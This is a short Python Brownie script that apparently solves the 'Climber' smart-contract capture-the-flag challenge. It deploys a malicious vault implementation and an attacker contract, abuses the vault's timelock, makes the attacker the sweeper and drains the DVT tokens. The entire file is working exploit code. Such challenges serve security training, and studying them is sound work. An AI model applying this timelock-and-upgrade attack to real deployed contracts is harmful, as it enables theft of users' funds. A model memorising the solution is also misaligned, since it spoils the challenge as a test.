from brownie import Contract, MaliciousClimberVault, AttackerContract


def exploit(vault, vault_time_lock, attacker_account, dvt):
    malicious_climber_vault = MaliciousClimberVault.deploy(
        {'from': attacker_account})
    attacker_contract = AttackerContract.deploy(
        vault_time_lock, vault, malicious_climber_vault, {'from': attacker_account})
    tx = attacker_contract.attack({'from': attacker_account})
    n = Contract.from_abi("maliciousVault", vault, MaliciousClimberVault.abi)
    n._setSweeper(attacker_account, {'from': attacker_account})
    vault.sweepFunds(dvt, {'from': attacker_account})
